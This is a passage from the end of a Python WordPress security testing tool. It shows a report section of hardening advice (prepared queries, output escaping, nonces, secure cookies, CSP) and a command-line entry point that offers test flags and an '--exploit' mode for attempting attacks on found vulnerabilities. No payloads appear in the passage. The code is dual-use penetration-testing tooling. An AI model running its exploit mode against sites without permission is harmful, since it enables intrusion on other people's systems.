                        f.write("## WordPress-Specific Recommendations\n\n")
                        f.write("1. **SQL Injection**:\n")
                        f.write("   - Use `$wpdb->prepare()` for queries:\n")
                        f.write("     ```php\n     $wpdb->prepare('SELECT * FROM wp_users WHERE ID = %d', $id);\n")
                        f.write("     ```\n")
                        f.write("   - Sanitize inputs: `sanitize_text_field($_POST['input']);`\n")
                        f.write("2. **XSS**:\n")
                        f.write("   - Escape outputs: `echo esc_html($_GET['s']);`\n")
                        f.write("   - Add CSP header:\n")
                        f.write("     ```php\n     header('Content-Security-Policy: default-src \\'self\\'; script-src \\'self\\';');\n")
                        f.write("     ```\n")
                        f.write("3. **CSRF**:\n")
                        f.write("   - Add nonces to forms:\n")
                        f.write("     ```php\n     wp_nonce_field('my_action', 'my_nonce');\n")
                        f.write("     ```\n")
                        f.write("4. **Cookies**:\n")
                        f.write("   - Set Secure, HttpOnly, and SameSite:\n")
                        f.write("     ```php\n     setcookie('name', 'value', ['secure' => true, 'httponly' => true, 'samesite' => 'Strict']);\n")
                        f.write("     ```\n")
                        f.write("5. **Security Plugins**: Install Wordfence or iThemes Security.\n")
                        f.write("6. **WooCommerce**: Sanitize fields in `woocommerce/templates/`:\n")
                        f.write("     ```php\n     esc_html($billing_first_name);\n")
                        f.write("     ```\n")
                        f.write("7. **Test in Staging**: Re-run exploits in a staging environment.\n")
                                
                self.log(f"Report saved to {output_file}", "success")
            except Exception as e:
                self.log(f"Error saving report: {e}", "error")
                
        return report

def main():
    """Main function to run the security tester."""
    parser = argparse.ArgumentParser(description="Website Security Testing Tool (WordPress Enhanced)")
    parser.add_argument("url", help="Target WordPress URL to test")
    parser.add_argument("-o", "--output", help="Output file for the report (JSON or Markdown)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Number of threads for concurrent testing")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    parser.add_argument("--sql", action="store_true", help="Test only for SQL injection")
    parser.add_argument("--xss", action="store_true", help="Test only for XSS")
    parser.add_argument("--csrf", action="store_true", help="Test only for CSRF")
    parser.add_argument("--cookies", action="store_true", help="Test only for cookie security")
    parser.add_argument("--csp", action="store_true", help="Test only for Content Security Policy")
    parser.add_argument("--info", action="store_true", help="Test only for information disclosure")
    parser.add_argument("--headers", action="store_true", help="Test only for security headers")
    parser.add_argument("--safe-mode", action="store_true", help="Avoid generating exploitable PoCs")
    parser.add_argument("--exploit", action="store_true", help="Attempt to exploit critical vulnerabilities")
    args = parser.parse_args()
    
    print(f"{Fore.CYAN}Website Security Testing Tool (WordPress Enhanced){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Warning: Use only on websites you own or have permission to test. Exploitation mode may trigger security plugins or affect user sessions.{Style.RESET_ALL}\n")
    
    tester = WebSecurityTester(
        args.url, args.verbose, args.threads, args.timeout, "security_tests", args.safe_mode, args.exploit
    )
    
    specific_tests = any([args.sql, args.xss, args.csrf, args.cookies, args.csp, args.info, args.headers])
    
    if specific_tests:
        tester.crawl_website()
        if args.sql:
            tester.test_sql_injection()
        if args.xss:
            tester.test_xss()
        if args.csrf:
            tester.test_csrf()
        if args.cookies:
            tester.test_cookie_security()
        if args.csp:
            tester.test_content_security_policy()
        if args.info:
            tester.test_information_disclosure()
        if args.headers:
            tester.test_security_headers()
    else:
        tester.run_all_tests()
        
    tester.generate_report(args.output)
    
if __name__ == "__main__":
    main()